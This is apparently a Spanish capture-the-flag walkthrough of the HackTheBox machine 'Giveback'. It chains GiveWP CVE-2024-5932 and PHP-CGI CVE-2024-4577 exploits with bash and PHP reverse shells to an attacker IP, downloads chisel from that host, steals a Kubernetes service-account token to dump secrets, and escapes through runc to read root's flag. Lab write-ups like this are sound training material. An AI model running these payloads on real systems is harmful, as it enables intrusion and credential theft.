Enumeración web#

El siguiente paso que doy es ver que versiones están corriendo en la página web ya en el escaneo nmap habíamos visto la versión de wordpress pero vamos a confirmarlo con whatweb.

TARGET='http://giveback.htb/'

whatweb $TARGET

Volvemos a confirmar que la versión de WordPress es la 6.8.1 entonces busco posibles vulnerabilidades en internet. Pero no encuentro nada que me sirva.

Si volvemos a mirar el resultado de whatweb vemos que hay otra tecnología llamada Give con la v3.14.0.

GiveWP - CVE-2024-5932#

CVE-2024-5932

GiveWP es un plugin de wordpress para realizar donaciones a través de wordpress. En este caso esta versión tiene un CVE-2024-5932 el cual nos permitirá inyectar objetos.

Desde esta URL (que es la página de donaciones la cual es vulnerable) usaremos un POC que hemos encontrado en github para llevar a cabo la explotación.

python3 CVE-2024-5932-rce.py -u 'http://giveback.htb/donations/the-things-we-need/' -c 'bash -c "bash -i >& /dev/tcp/10.10.14.47/4444 0>&1"'

nc -lvnp 4444

Vemos que hemos conseguido la shell y estamos dentro de la máquina pero algo empieza raro ya que como vemos estamos como root lo que nos podría indicar que estamos dentro de un contenedor.

Local Port Forwarding - Chisel#

Ahora usando chisel voy a hacer local port forwarding para así poder interceptar las peticiones php-cgi con burpsuit.

Primero nos descargamos el binario chisel a la máquina victima usando php:

php -r "echo file_get_contents('http://10.10.14.45:8080/chisel');" > /tmp/chisel

Una vez con chisel en ambas máquinas, abrimos el servidor en la máquina atacante:

chisel server -p 1080 --reverse

Y en la máquina victima:

/tmp/chisel client 10.10.14.45:1080 R::5000:10.43.2.241:5000

Ejecutamos ambos comandos y establecemos la conexión:

Una vez establecemos la conexión abrimos el navegador y entramos a localhost:5000 que es donde estará la página a la cual queremos acceder.

PHP-CGI Parameter Injection Vulnerability - CVE-2024-4577#

El siguiente paso que doy es buscar si esta versión de php-cgi tiene algún tipo de vulnerabilidad que en este caso era lo correcto:

PHP-CGI 3.8.3 - CVE-2024-4577

Usando este repositorio de ejemplo pruebo ha inyectar comandos en el handler de php-cgi:

GET /cgi-bin/php-cgi?1%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input

id

Como vemos que nos funciona, ahora nos mandamos una reverse shell a nuestro listener para conseguir acceso al otro container:

GET /cgi-bin/php-cgi?1%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input

php -r '$sock=fsockopen("10.10.14.54",4444);exec("sh <&3 >&3 2>&3");'
 | disown

Enumerar secrets con Service Account Token#

Containers Kubernetes - Swisskyrepo

Lo primero que encontramos es el token para autenticar nos:

cat /var/run/secrets/kubernetes.io/serviceaccount/token

El siguiente paso que doy es con el token y sabiendo el endpoit de la API de kubernetes, intento que la api me conteste para comprobar que esta funcionando:

curl -k -H "Authorization: Bearer $TOKEN" https://10.43.0.1:443/api

Luego de esto intento a listar secretos pero me da un error de Unathorized.

Entonces lo que pruebo es a solicitar a la API del server address los secretos para ver si estoy autorizado.

curl -k -H "Authorization: Bearer $TOKEN" https://10.10.11.94:6443/api/v1/namespaces/default/secrets > /tmp/secrets.txt

También filtro los secretos para quitarme las largas lineas de caracteres existentes en el texto con awk:

awk 'length<=300 && /[[:alpha:]]/ && /[[:space:]]/' /tmp/secrets.txt > /tmp/limpio.txt

Runc Privielege Escalation#

Runc Privilege Escalation

Mirando en hacktricks escalados de privilegos de runc encuentro el siguiente articulo, el cual pruebo a realizar en este caso:

Primero creamos un archivo config.json usando la opción spec:

runc spec

Una vez tenemos el archivo creado debemos añadir el punto de montaje raiz para poder acceder a el, y lo conseguimos con los siguientes lineas:

                {           "type": "bind",
                            "source": "/",
                            "destination": "/",
                            "options": [
                                "rbind",
                                "rw",
                                "rprivate"
                                 ]
                },

Luego tenemos que crear la carpeta rootfs y luego ejecutar el contenedor:

mkdir rootfs

sudo /opt/debug run demo

cat /root/root.txt
